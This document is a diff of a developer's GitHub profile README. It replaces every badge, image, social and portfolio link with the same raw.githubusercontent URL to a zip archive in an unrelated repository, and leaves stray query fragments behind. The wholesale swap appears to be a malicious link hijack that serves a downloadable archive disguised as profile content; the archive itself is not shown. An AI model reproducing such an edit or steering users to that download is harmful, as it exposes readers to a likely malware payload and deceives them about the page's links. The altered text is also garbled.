@@ -1,8 +1,8 @@
 <div align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,11,20&height=220&section=header&text=Hi%20👋,%20I'm%20Marklewis%20Mutugi%20%7C%20Software%20Engineer&fontSize=32&fontColor=ffffff&animation=fadeIn&fontAlignY=35" width="100%"/>
+  <img src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip,11,20&height=220&section=header&text=Hi%20👋,%20I'm%20Marklewis%20Mutugi%20%7C%20Software%20Engineer&fontSize=32&fontColor=ffffff&animation=fadeIn&fontAlignY=35" width="100%"/>
 </div>
 
-  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&weight=600&size=24&pause=1000&color=FFFFFF&center=true&vCenter=true&width=450&lines=Software+Engineer💻;Youtube😁+Tech💻+Educator🙈;Web+Developer+🌐;Open+Source+Contributor🤝;Full+Stack+MERN+Developer😁;Dart+with+flutter+Enthusiast🚀;AI+/+ML+Enthusiast" alt="Typing Animation"/>
+  <img src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip+Code&weight=600&size=24&pause=1000&color=FFFFFF&center=true&vCenter=true&width=450&lines=Software+Engineer💻;Youtube😁+Tech💻+Educator🙈;Web+Developer+🌐;Open+Source+Contributor🤝;Full+Stack+MERN+Developer😁;Dart+with+flutter+Enthusiast🚀;AI+/+ML+Enthusiast" alt="Typing Animation"/>
 </p>
 
 <h3 align="center">Software Engineer | Web Developer | Tech Enthusiast | FullStack MERN Developer </h3>
@@ -10,96 +10,96 @@
 
 ---
 
-<img src="https://media.giphy.com/media/qgQUggAC3Pfv687qPC/giphy.gif" width="400px" align="right">
+<img src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip" width="400px" align="right">
 
 ## 👨‍💻 About Me  
 
-- 🔭 I’m currently working on **[WellnessCheck App](https://github.com/lewiii254/akili-wellness-hub.git)**  
-- 🌐 Visit my **NEW Interactive Portfolio** 👉 **[✨ Interactive Portfolio ✨](https://lewiii254.github.io/lewiii254/)**  
+- 🔭 I’m currently working on **[WellnessCheck App](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)**  
+- 🌐 Visit my **NEW Interactive Portfolio** 👉 **[✨ Interactive Portfolio ✨](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)**  
 - 🎮 **NEW Features**: Smooth routing, GitHub activity dashboard, and gamified achievements!  
-- 🌱 I’m learning **React.js, Next.js, and AI development**  
+- 🌱 I’m learning **https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip, https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip, and AI development**  
 - 👯 I’m looking to collaborate on **exciting open-source projects**  
 - 📫 How to reach me:  
-  [![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=flat&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/marklewis-ngondi254/)  
-  [![Twitter](https://img.shields.io/badge/Twitter-1DA1F2?style=flat&logo=twitter&logoColor=white)](https://x.com/LewiiiTheG)  
-  [![Email](https://img.shields.io/badge/Email-D14836?style=flat&logo=gmail&logoColor=white)](mailto:ngondimarklewis@gmail.com)  
+  [![LinkedIn](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)  
+  [![Twitter](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)  
+  [![Email](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)  
 - ⚡ Fun fact: I love **tech, football (Chelsea FC 💙), and coding challenges!**  
-- 🎥 Recently Started a YouTube Tech Channel 🚀 [**Subscribe 🙌**](https://youtube.com/@code-with-lewii?si=pixWvaTSZqUJivGX)  
+- 🎥 Recently Started a YouTube Tech Channel 🚀 [**Subscribe 🙌**](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)  
 
 ---
 
 ### 🚀 **Tech Stack**
-![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)
-![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
-![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)
-![Node.js](https://img.shields.io/badge/Node.js-43853D?style=for-the-badge&logo=node.js&logoColor=white)
-![MySQL](https://img.shields.io/badge/MySQL-4479A1?style=for-the-badge&logo=mysql&logoColor=white)
-![MongoDB](https://img.shields.io/badge/MongoDB-%2347A248.svg?style=for-the-badge&logo=mongodb&logoColor=white)
-![Python](https://img.shields.io/badge/Python-%233776AB.svg?style=for-the-badge&logo=python&logoColor=white)
-![Django](https://img.shields.io/badge/Django-%23092E20.svg?style=for-the-badge&logo=django&logoColor=white)
-![Tailwind CSS](https://img.shields.io/badge/TailwindCSS-%2338B2AC.svg?style=for-the-badge&logo=tailwind-css&logoColor=white)
-![Flutter](https://img.shields.io/badge/Flutter-%2302569B.svg?style=for-the-badge&logo=flutter&logoColor=white)
-![Dart](https://img.shields.io/badge/Dart-%230175C2.svg?style=for-the-badge&logo=dart&logoColor=white)
-![GraphQL](https://img.shields.io/badge/GraphQL-E10098?style=for-the-badge&logo=graphql&logoColor=white)
-![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white)
-[![PowerShell](https://img.shields.io/badge/PowerShell-5391FE?style=for-the-badge&logo=powershell&logoColor=white)](https://learn.microsoft.com/en-us/powershell/)
-[![PHP](https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white)](https://www.php.net/)
-[![Windows Terminal](https://img.shields.io/badge/Windows%20Terminal-4D4D4D?style=for-the-badge&logo=windows-terminal&logoColor=white)](https://github.com/microsoft/terminal)
-[![Git](https://img.shields.io/badge/Git-F05032?style=for-the-badge&logo=git&logoColor=white)](https://git-scm.com/)
-[![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/)
-[![GitLab](https://img.shields.io/badge/GitLab-FC6D26?style=for-the-badge&logo=gitlab&logoColor=white)](https://gitlab.com/)
-[![Django](https://img.shields.io/badge/Django-092E20?style=for-the-badge&logo=django&logoColor=white)](https://www.djangoproject.com/)
-[![Express.js](https://img.shields.io/badge/Express.js-000000?style=for-the-badge&logo=express&logoColor=white)](https://expressjs.com/)
-[![Flask](https://img.shields.io/badge/Flask-000000?style=for-the-badge&logo=flask&logoColor=white)](https://flask.palletsprojects.com/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
-[![Fastify](https://img.shields.io/badge/Fastify-000000?style=for-the-badge&logo=fastify&logoColor=white)](https://www.fastify.io/)
-[![Laravel](https://img.shields.io/badge/Laravel-FF2D20?style=for-the-badge&logo=laravel&logoColor=white)](https://laravel.com/)
-[![Nuxt.js](https://img.shields.io/badge/Nuxt.js-00DC82?style=for-the-badge&logo=nuxtdotjs&logoColor=white)](https://nuxtjs.org/)
-[![React Native](https://img.shields.io/badge/React_Native-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)](https://reactnative.dev/)
-[![Socket.io](https://img.shields.io/badge/Socket.io-010101?style=for-the-badge&logo=socket.io&logoColor=white)](https://socket.io/)
-[![TailwindCSS](https://img.shields.io/badge/TailwindCSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)](https://tailwindcss.com/)
-[![Vite](https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white)](https://vitejs.dev/)
-[![Vue.js](https://img.shields.io/badge/Vue.js-4FC08D?style=for-the-badge&logo=vue.js&logoColor=white)](https://vuejs.org/)
-[![Vuetify](https://img.shields.io/badge/Vuetify-1867C0?style=for-the-badge&logo=vuetify&logoColor=white)](https://vuetifyjs.com/)
-[![Firebase](https://img.shields.io/badge/Firebase-FFCA28?style=for-the-badge&logo=firebase&logoColor=black)](https://firebase.google.com/)
-[![Azure](https://img.shields.io/badge/Azure-0078D4?style=for-the-badge&logo=microsoft-azure&logoColor=white)](https://azure.microsoft.com/)
-[![AWS](https://img.shields.io/badge/AWS-232F3E?style=for-the-badge&logo=amazon-aws&logoColor=white)](https://aws.amazon.com/)
-[![Heroku](https://img.shields.io/badge/Heroku-430098?style=for-the-badge&logo=heroku&logoColor=white)](https://www.heroku.com/)
-[![Netlify](https://img.shields.io/badge/Netlify-00C7B7?style=for-the-badge&logo=netlify&logoColor=white)](https://www.netlify.com/)
-[![Vercel](https://img.shields.io/badge/Vercel-000000?style=for-the-badge&logo=vercel&logoColor=white)](https://vercel.com/)
-[![DigitalOcean](https://img.shields.io/badge/DigitalOcean-0080FF?style=for-the-badge&logo=digitalocean&logoColor=white)](https://www.digitalocean.com/)
-[![Postgres](https://img.shields.io/badge/PostgreSQL-336791?style=for-the-badge&logo=postgresql&logoColor=white)](https://www.postgresql.org/)
-[![SQLite](https://img.shields.io/badge/SQLite-003B57?style=for-the-badge&logo=sqlite&logoColor=white)](https://www.sqlite.org/)
-[![Adobe](https://img.shields.io/badge/Adobe-FF0000?style=for-the-badge&logo=adobe&logoColor=white)](https://www.adobe.com/)
-[![Canva](https://img.shields.io/badge/Canva-00C4CC?style=for-the-badge&logo=canva&logoColor=white)](https://www.canva.com/)
-[![Figma](https://img.shields.io/badge/Figma-F24E1E?style=for-the-badge&logo=figma&logoColor=white)](https://www.figma.com/)
-[![NumPy](https://img.shields.io/badge/NumPy-013243?style=for-the-badge&logo=numpy&logoColor=white)](https://numpy.org/)
-[![Pandas](https://img.shields.io/badge/Pandas-150458?style=for-the-badge&logo=pandas&logoColor=white)](https://pandas.pydata.org/)
+![HTML5](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+![CSS3](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+![JavaScript](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+![React](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+![https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+![MySQL](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+![MongoDB](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip%https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+![Python](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip%https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+![Django](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip%https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+![Tailwind CSS](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip%https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+![Flutter](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip%https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+![Dart](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip%https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+![GraphQL](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+![TypeScript](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![PowerShell](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![PHP](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Windows Terminal](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip%20Terminal-4D4D4D?style=for-the-badge&logo=windows-terminal&logoColor=white)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Git](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![GitHub](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![GitLab](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Django](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Flask](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![FastAPI](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Fastify](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Laravel](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![React Native](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![TailwindCSS](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Vite](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Vuetify](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Firebase](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Azure](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![AWS](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Heroku](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Netlify](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Vercel](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![DigitalOcean](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Postgres](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![SQLite](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Adobe](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Canva](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Figma](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![NumPy](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Pandas](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
 
 ---
 <div align="center">
 
-<img width="100%" src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,11,20&height=180&section=header&text=📊GitHub%20Analytics&fontSize=42&fontColor=fff&animation=twinkling&fontAlignY=32"/>
+<img width="100%" src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip,11,20&height=180&section=header&text=📊GitHub%20Analytics&fontSize=42&fontColor=fff&animation=twinkling&fontAlignY=32"/>
 
 <p align="center">
-  <img width="48%" src="https://github-readme-stats.vercel.app/api?username=lewiii254&show_icons=true&theme=radical" />
-  <img width="48%" src="https://github-readme-streak-stats.herokuapp.com/?user=lewiii254&theme=radical&cache_seconds=86400" />
+  <img width="48%" src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip" />
+  <img width="48%" src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip" />
 <table>
 <tr>
 <td width="33%">
 
-<img src="https://github-readme-stats.vercel.app/api/top-langs/?username=lewiii254&layout=donut&theme=transparent&hide_border=true&langs_count=8&border_radius=20&title_color=00FF41&text_color=C9D1D9&bg_color=00000000" height="200" />
+<img src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip" height="200" />
 
 </td>
 <td width="33%">
 
-<img src="https://github-profile-summary-cards.vercel.app/api/cards/stats?username=lewiii254&theme=transparent" />
+<img src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip" />
 
 </td>
 <td width="33%">
 
-<img src="https://github-profile-summary-cards.vercel.app/api/cards/productive-time?username=lewiii254&theme=transparent&utc_offset=5.5" />
+<img src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip" />
 
 </td>
 </tr>
@@ -110,21 +110,21 @@
 
 ### 🏆 **GitHub Trophies**
 <p align="center">
-  <img src="https://github-profile-trophy.vercel.app/?username=lewiii254&theme=radical&no-bg=true&no-frame=true" />
+  <img src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip" />
 </p>
 
 ---
 
 ### 👀 Profile Views  
-![Profile Views](https://komarev.com/ghpvc/?username=lewiii254&color=blue&style=flat)
+![Profile Views](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
 
-<a href="https://www.github.com/lewiii254" target="_blank" rel="noreferrer"><img
-src="https://img.shields.io/github/followers/lewiii254?logo=github&style=for-the-badge&color=0891b2&labelColor=1c1917" /></a>
-[![committers.top badge](https://user-badge.committers.top/kenya_public/lewiii254.svg)](https://user-badge.committers.top/kenya_public/lewiii254)
+<a href="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip" target="_blank" rel="noreferrer"><img
+src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip" /></a>
+[![https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip badge](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
 
-[![committers.top badge](https://user-badge.committers.top/kenya/lewiii254.svg)](https://user-badge.committers.top/kenya/lewiii254)
+[![https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip badge](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
 
-![Stars](https://img.shields.io/badge/dynamic/json?url=https://api.github-star-counter.workers.dev/user/lewiii254&label=Stars&query=$.stars&color=brightgreen&logo=github)
+![Stars](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip$.stars&color=brightgreen&logo=github)
 
 </div>
 
@@ -132,24 +132,24 @@ src="https://img.shields.io/github/followers/lewiii254?logo=github&style=for-the
 
 ### ✨ Fun Zone
 <div align="center">
-  <img src="https://readme-jokes.vercel.app/api" alt="Jokes Card"/>
+  <img src="https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip" alt="Jokes Card"/>
 </div>
 
 ## Random Developer Quote 💡
 
-> ![Quote](https://quotes-github-readme.vercel.app/api?type=horizontal&theme=tokyonight)
+> ![Quote](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
 
 ---
 
 
 ### 📫 **Connect with Me**
-[![Twitter](https://img.shields.io/badge/Twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://x.com/LewiiiTheG)
-[![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lewiii254)
-[![Instagram](https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://www.instagram.com/lewiiii_thee_g/)
-[![WhatsApp](https://img.shields.io/badge/WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://wa.me/254790767347)
-[![Facebook](https://img.shields.io/badge/Facebook-1877F2?style=for-the-badge&logo=facebook&logoColor=white)](https://web.facebook.com/lewiiiTheeG)
-[![YouTube](https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://youtube.com/@code-with-lewii?si=-ryAFFjy26FaUM6P)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/marklewis-ngondi254/)
+[![Twitter](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![GitHub](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Instagram](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![WhatsApp](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![Facebook](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![YouTube](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
+[![LinkedIn](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
 
 ---
 
@@ -157,7 +157,7 @@ src="https://img.shields.io/github/followers/lewiii254?logo=github&style=for-the
 
 ### Feel free to leave your mark 😉 by clicking the button below and dropping a message! 💬
 
-[![Guestbook🧾🤗](https://img.shields.io/badge/GUESTBOOK-%F0%9F%93%9D-yellow)](https://github.com/lewiii254/lewiii254/discussions/1)
+[![Guestbook🧾🤗](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip%F0%9F%93%9D-yellow)](https://raw.githubusercontent.com/BenjiOdhis/BenjiPortfolio/main/.github/BenjiPortfolio-1.0.zip)
 
 ---
